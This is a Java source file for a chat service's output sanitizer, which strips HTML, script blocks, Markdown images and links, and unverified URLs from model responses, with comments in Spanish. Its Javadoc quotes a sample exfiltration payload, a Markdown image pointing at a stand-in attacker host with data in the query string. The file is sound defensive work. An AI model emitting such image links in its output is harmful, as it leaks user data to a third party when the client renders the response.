package com.idp.chat.service;

import java.util.HashSet;
import java.util.Locale;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Sanea la salida del modelo antes de persistirla y devolverla (SEC-031/SEC-047): el contenido de una respuesta es
 * texto plano. Quita etiquetas HTML (con el contenido de script/style), imagenes y enlaces Markdown (conserva el texto
 * visible del enlace) y URLs que no aparezcan en las citas verificadas (un exfiltrador tipico es
 * {@code ![x](https://atacante/?q=dato)}, que el cliente descarga al renderizar).
 */
public final class OutputSanitizer {

    static final String REMOVED_LINK = "[enlace eliminado]";

    private static final Pattern ACTIVE_BLOCK = Pattern.compile("(?is)<\\s*(script|style|iframe|object|embed|svg|math)"
            + "\\b[^>]*>.*?<\\s*/\\s*\\1\\s*>");
    private static final Pattern TAG = Pattern.compile("(?s)</?\\s*[a-zA-Z!?][^>]*(?:>|$)");
    private static final Pattern MD_IMAGE = Pattern.compile("!\\[[^\\]]*\\](?:\\([^)]*\\)|\\[[^\\]]*\\])");
    private static final Pattern MD_LINK = Pattern.compile("\\[([^\\]]*)\\]\\([^)]*\\)");
    private static final Pattern MD_REF_DEF = Pattern.compile("(?m)^[ \\t]*\\[[^\\]]+\\]:[ \\t]*\\S+.*$");
    private static final Pattern URL = Pattern.compile("(?i)(?:\\b(?:https?|ftp|file|data|javascript|vbscript)\\s*:"
            + "[^\\s<>\"')\\]]+|\\bwww\\.[^\\s<>\"')\\]]+)");
    private static final Pattern CONTROL = Pattern.compile("[\\p{Cc}&&[^\\n\\t]]");

    private OutputSanitizer() {
    }

    /** URLs (normalizadas) presentes en los textos dados: las unicas que sobreviven al saneamiento. */
    public static Set<String> urlsIn(Iterable<String> texts) {
        Set<String> out = new HashSet<>();
        for (String t : texts) {
            Matcher m = URL.matcher(t);
            while (m.find()) {
                out.add(normalizeUrl(m.group()));
            }
        }
        return out;
    }

    public static String sanitize(String text, Set<String> allowedUrls) {
        if (text == null) {
            return "";
        }
        String s = CONTROL.matcher(text).replaceAll(" ");
        s = ACTIVE_BLOCK.matcher(s).replaceAll(" ");
        s = TAG.matcher(s).replaceAll(" ");
        s = MD_IMAGE.matcher(s).replaceAll(" ");
        s = MD_REF_DEF.matcher(s).replaceAll(" ");
        s = MD_LINK.matcher(s).replaceAll("$1");
        Matcher m = URL.matcher(s);
        StringBuilder sb = new StringBuilder();
        while (m.find()) {
            boolean ok = allowedUrls != null && allowedUrls.contains(normalizeUrl(m.group()));
            m.appendReplacement(sb, Matcher.quoteReplacement(ok ? m.group() : REMOVED_LINK));
        }
        m.appendTail(sb);
        return sb.toString().replaceAll("[ \\t]{2,}", " ").strip();
    }

    private static String normalizeUrl(String url) {
        String u = url.toLowerCase(Locale.ROOT);
        while (!u.isEmpty() && ".,;:!?".indexOf(u.charAt(u.length() - 1)) >= 0) {
            u = u.substring(0, u.length() - 1);
        }
        return u;
    }
}
